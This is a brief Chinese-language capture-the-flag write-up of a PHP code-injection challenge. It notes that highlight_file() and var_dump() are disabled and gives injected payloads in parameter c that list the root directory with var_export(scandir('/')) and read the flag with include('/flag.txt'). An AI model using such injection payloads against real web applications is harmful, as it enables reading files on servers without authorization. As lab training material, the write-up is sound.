![image-20250404162707148](./assets/image-20250404162707148.png)



还是禁用highlight_file()



尝试扫描根目录

```
c=var_dump(scandir("/"));
```

但是var_dump()被禁用了

var_export()可以

```
c=var_export(scandir("/"));
```

![image-20250404163157733](./assets/image-20250404163157733.png)



读取

```
c=include("/flag.txt");
```

![image-20250404163225332](./assets/image-20250404163225332.png)